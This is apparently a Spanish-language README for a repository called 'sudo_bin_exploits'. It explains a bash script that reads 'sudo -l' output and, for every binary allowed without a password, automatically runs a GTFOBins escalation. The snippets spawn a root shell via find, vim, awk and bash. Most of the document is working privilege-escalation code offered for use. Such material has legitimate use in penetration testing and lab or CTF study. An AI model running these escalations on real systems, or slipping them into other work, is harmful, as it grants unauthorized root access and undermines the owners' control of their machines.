# sudo_bin_exploits
Script para la Escalada de Privilegios según el output de Sudo -l

### Explicación del Script

1. **Comprobación inicial de `sudo -l`**:
    ```bash
    if ! sudo -l &>/dev/null; then
        echo "No tienes permisos para ejecutar sudo -l. Salida."
        exit 1
    fi
    ```
   - Verifica si el usuario actual tiene permisos para ejecutar `sudo -l`. Si no los tiene, el script muestra un mensaje de error y termina.

2. **Captura de la salida de `sudo -l`**:
    ```bash
    sudo_list=$(sudo -l)
    ```
   - Guarda la salida completa de `sudo -l` en la variable `sudo_list` para luego verificarla y ver qué comandos están permitidos sin contraseña.

3. **Definición de funciones de escalada para cada binario**:
    ```bash
    escalar_find() { sudo find . -exec /bin/sh \; -quit; }
    escalar_vim() { sudo vim -c ':!/bin/sh'; }
    # ...y así sucesivamente para todos los binarios en GTFOBins
    ```
   - Cada función corresponde a un binario específico y contiene el comando para escalar privilegios si `sudo` permite ejecutarlo sin contraseña. Por ejemplo:
      - **`find`**: Utiliza `find` para ejecutar `/bin/sh` con privilegios elevados.
      - **`vim`**: Abre `vim` con permisos de `sudo` y ejecuta `:!/bin/sh` para iniciar una shell de root desde el editor.
      - **`bash`**: Inicia una shell con `sudo bash`.

4. **Bucle para verificar cada binario en `sudo_list`**:
    ```bash
    for cmd in apache2 apt aptget aria2c ash awk base64 bash ... zip; do
        if echo "$sudo_list" | grep -q "(ALL) NOPASSWD: /usr/bin/$cmd"; then
            escalar_$cmd
        fi
    done
    ```
   - El bucle `for` recorre una lista de binarios que tienen métodos de escalada documentados en GTFOBins. Para cada binario:
      - Verifica con `grep` si el binario aparece en la lista de comandos que se pueden ejecutar sin contraseña (`NOPASSWD`) en `sudo_list`.
      - Si encuentra el binario en `sudo_list`, llama a la función `escalar_$cmd`, ejecutando el método de escalada para ese binario específico.
   - **Ejemplo**: Si `sudo -l` muestra que el usuario puede ejecutar `awk` sin contraseña, el script llamará a `escalar_awk`, que ejecuta `sudo awk 'BEGIN {system("/bin/sh")}'`.

### Ejemplo de Ejecución

Supón que `sudo -l` da como resultado que el usuario puede ejecutar `vim` y `find` sin contraseña. El script hará lo siguiente:
1. Detectará que `vim` está permitido sin contraseña y llamará a `escalar_vim`, ejecutando `sudo vim -c ':!/bin/sh'`.
2. Detectará que `find` también está permitido sin contraseña y ejecutará `sudo find . -exec /bin/sh \; -quit`.
